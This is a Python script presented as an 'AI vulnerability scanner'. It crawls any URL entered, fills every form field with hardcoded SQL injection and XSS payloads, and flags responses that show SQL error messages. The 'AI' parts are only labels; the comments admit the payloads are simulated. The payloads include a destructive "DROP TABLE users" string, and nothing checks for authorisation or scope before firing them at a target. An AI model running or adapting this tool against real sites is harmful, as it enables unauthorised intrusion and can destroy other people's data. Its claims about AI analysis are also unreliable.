import requests
from bs4 import BeautifulSoup
import time
import random
from rich.console import Console
from rich.table import Table
from rich.progress import track
from colorama import init, Fore, Style

init()
console = Console()

def animated_banner():
    banner = """
â–ˆâ–€â–€â€ƒâ–ˆâ–‘â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–„â–‘â–ˆâ€ƒ â€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ–‘â–ˆâ€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ–‘â–ˆ
â–ˆâ–„â–„â€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ–‘â–€â–ˆâ€ƒ â€ƒâ–ˆâ–„â–€â€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–„â–€â€ƒâ–ˆâ–„â–ˆ
        AI VULN SCANNER | OWNER ABHI
    """
    for line in banner.splitlines():
        print(Fore.CYAN + line)
        time.sleep(0.1)

def generate_ai_payloads():
    # Simulated AI-generated payloads
    return [
        "' OR '1'='1",
        "<script>alert('XSS')</script>",
        "' UNION SELECT NULL,NULL--",
        "'; DROP TABLE users; --",
        "' OR sleep(5)--",
        "<img src=x onerror=alert('XSS')>"
    ]

def explain_vulnerability(payload):
    if "script" in payload or "onerror" in payload:
        return "Likely XSS: Malicious script injected into output"
    elif "UNION" in payload or "DROP" in payload:
        return "Likely SQL Injection: SQL query altered via user input"
    elif "sleep" in payload:
        return "Time-based SQLi: Response delay may reveal DBMS behavior"
    else:
        return "Injection detected. May exploit poor input validation."

def ai_analyze_response(text):
    # Simulated AI logic to detect known signs of vulnerabilities
    signs = [
        "you have an error in your sql syntax",
        "unclosed quotation mark",
        "syntax error",
        "mysql_fetch",
        "unexpected end of SQL command"
    ]
    for sign in signs:
        if sign in text.lower():
            return True
    return False

def scan_url(url):
    console.print(f"[bold yellow]AI Scan Started for:[/bold yellow] {url}")
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        payloads = generate_ai_payloads()
        results = []

        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            for payload in payloads:
                data = {}
                for inp in inputs:
                    name = inp.get('name')
                    if name:
                        data[name] = payload
                target_url = requests.compat.urljoin(url, action)
                if method == 'post':
                    response = requests.post(target_url, data=data)
                else:
                    response = requests.get(target_url, params=data)
                vulnerable = ai_analyze_response(response.text)
                if vulnerable:
                    results.append((target_url, payload, explain_vulnerability(payload)))

        if results:
            table = Table(title="AI Vulnerability Report", show_lines=True)
            table.add_column("URL", style="cyan")
            table.add_column("Payload", style="magenta")
            table.add_column("Explanation", style="green")
            for res in results:
                table.add_row(res[0], res[1], res[2])
            console.print(table)
        else:
            console.print("[green]No critical vulnerabilities detected by AI.[/green]")

    except Exception as e:
        console.print(f"[bold red]Error:[/bold red] {e}")

if __name__ == "__main__":
    animated_banner()
    target = input(Fore.YELLOW + "\n[INPUT] Enter the target URL to scan: ")
    for _ in track(range(15), description="ðŸ§  AI initializing..."):
        time.sleep(0.05)
    scan_url(target)
